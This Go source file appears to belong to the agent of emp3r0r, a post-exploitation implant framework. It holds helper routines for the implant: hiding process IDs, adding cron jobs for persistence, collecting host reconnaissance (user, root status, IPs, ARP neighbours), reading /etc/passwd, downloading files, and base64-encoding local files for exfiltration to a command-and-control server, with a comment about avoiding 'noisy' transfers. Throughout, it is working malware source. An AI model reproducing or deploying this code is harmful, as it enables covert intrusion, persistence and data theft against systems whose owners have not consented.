package agent

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	gops "github.com/mitchellh/go-ps"
	"github.com/zcalusic/sysinfo"
)

// IsCommandExist check if an executable is in $PATH
func IsCommandExist(exe string) bool {
	_, err := exec.LookPath(exe)
	return err == nil
}

// IsProcAlive check if a process name exists, returns its PID
func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
	allprocs, err := gops.Processes()
	if err != nil {
		log.Println(err)
		return
	}

	for _, p := range allprocs {
		if p.Executable() == procName {
			alive = true
			proc, err := os.FindProcess(p.Pid())
			if err != nil {
				log.Println(err)
			}
			procs = append(procs, proc)
		}
	}

	return
}

// IsFileExist check if a file exists
func IsFileExist(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	}
	return true
}

// RemoveDupsFromArray remove duplicated items from string slice
func RemoveDupsFromArray(array []string) (result []string) {
	m := make(map[string]bool)
	for _, item := range array {
		if _, ok := m[item]; !ok {
			m[item] = true
		}
	}

	for item := range m {
		result = append(result, item)
	}
	return result
}

// UpdateHIDE_PIDS update HIDE PID list
func UpdateHIDE_PIDS() error {
	HIDE_PIDS = RemoveDupsFromArray(HIDE_PIDS)
	return ioutil.WriteFile("/dev/shm/emp3r0r_pids", []byte(strings.Join(HIDE_PIDS, "\n")), 0600)
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := ioutil.WriteFile(PIDFile, []byte(myPIDText), 0600); err != nil {
			log.Printf("Write PIDFile: %v", err)
		}
	}()

	pidBytes, err := ioutil.ReadFile(PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// is the agent alive?
// connect to SocketName, send a message, see if we get a reply
func IsAgentAlive() bool {
	log.Println("Testing if agent is alive...")
	c, err := net.Dial("unix", SocketName)
	if err != nil {
		log.Printf("Seems dead: %v", err)
		return false
	}
	defer c.Close()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for {
			n, err := r.Read(buf[:])
			if err != nil {
				return
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for {
		_, err := c.Write([]byte("emp3r0r"))
		if err != nil {
			log.Print("write error:", err)
			break
		}
		if <-replyFromAgent == "emp3r0r" {
			log.Println("Yes it's alive")
			return true
		}
		time.Sleep(1e9)
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *MsgTunData) error {
	var out = json.NewEncoder(H2Json)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// RandInt random int between given interval
func RandInt(min, max int) int {
	seed := rand.NewSource(time.Now().UTC().Unix())
	return min + rand.New(seed).Intn(max-min)
}

// Download download via EmpHTTPClient
func Download(url, path string) (err error) {
	var (
		resp *http.Response
		data []byte
	)
	resp, err = HTTPClient.Get(url)
	if err != nil {
		return
	}

	data, err = ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return
	}

	return ioutil.WriteFile(path, data, 0600)
}

// AppendToFile append text to a file
func AppendToFile(filename string, text string) (err error) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	if _, err = f.WriteString(text); err != nil {
		return
	}
	return
}

// Copy copy file from src to dst
func Copy(src, dst string) error {
	in, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, in, 0755)
}

// GetKernelVersion uname -r
func GetKernelVersion() (ver string) {
	var si sysinfo.SysInfo
	si.GetSysInfo()

	return si.Kernel.Release
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *SystemInfo {
	var (
		si   sysinfo.SysInfo
		info SystemInfo
	)
	si.GetSysInfo() // read sysinfo

	info.Tag = Tag

	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
	info.Hostname = fmt.Sprintf("%s (%s)", si.Node.Hostname, si.Node.MachineID)
	info.Kernel = si.Kernel.Release
	info.Arch = si.Kernel.Architecture
	info.CPU = fmt.Sprintf("%s (x%d)", si.CPU.Model, getCPUCnt())
	info.Mem = fmt.Sprintf("%d MB", getMemSize())
	info.Hardware = CheckProduct()
	info.Container = CheckContainer()
	info.Transport = Transport

	// have root?
	info.HasRoot = os.Geteuid() == 0

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = tun.IsTor(CCAddress)

	// has internet?
	info.HasInternet = tun.HasInternetAccess()

	// IP address?
	info.IPs = tun.CollectLocalIPs()

	// arp -a ?
	info.ARP = tun.IPNeigh()

	return &info
}

// CheckAccount : check account info by parsing /etc/passwd
func CheckAccount(username string) (accountInfo map[string]string, err error) {
	// initialize accountInfo map
	accountInfo = make(map[string]string)

	// parse /etc/passwd
	passwdFile, err := os.Open("/etc/passwd")
	if err != nil {
		log.Println(err)
		return nil, err
	}
	scanner := bufio.NewScanner(passwdFile)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Split(line, ":")
		accountInfo["username"] = fields[0]
		if username != accountInfo["username"] {
			continue
		}
		accountInfo["home"] = fields[len(fields)-2]
		accountInfo["shell"] = fields[len(fields)-1]

	}

	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

func getMemSize() (size int) {
	var err error
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lineSplit := strings.Fields(scanner.Text())

		if lineSplit[0] == "MemTotal:" {
			size, err = strconv.Atoi(lineSplit[1])
			size /= 1024
			if err != nil {
				size = -1
			}
		}
	}

	return
}

func getCPUCnt() (cpuCnt int) {
	f, err := os.Open("/proc/cpuinfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		if strings.HasPrefix(line, "processor") {
			cpuCnt++
		}
	}

	return
}

// send local file to CC
func file2CC(filepath string) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}
	// file sha256sum
	sum := sha256.Sum256(bytes)
	checksum = fmt.Sprintf("%x", sum)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return checksum, errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := MsgTunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}
